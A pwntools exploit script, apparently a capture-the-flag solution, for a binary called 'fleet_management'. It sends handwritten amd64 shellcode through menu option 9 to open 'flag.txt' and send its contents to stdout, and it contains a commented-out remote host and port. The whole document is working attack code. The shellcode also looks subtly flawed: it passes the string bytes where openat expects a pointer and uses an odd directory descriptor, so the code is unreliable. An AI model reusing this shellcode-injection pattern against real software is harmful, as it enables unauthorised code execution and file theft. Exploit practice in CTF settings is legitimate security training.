#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template fleet_management
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fleet_management')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *beta_feature+95
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
#io = remote('64.227.37.197', 30655)

sh = asm('''
        mov eax, 257
        mov rsi, 0x7478742e67616c66
        mov edx, 0
        mov rdi, -14
        syscall
        mov rsi, rax
        mov edi, 1
        mov eax, 40
        mov edx, 0x7fff
        mov r10, 100
        syscall
        ''')
print(len(sh))
io.sendlineafter(b'do? ', b'9')
io.send(sh)

io.interactive()

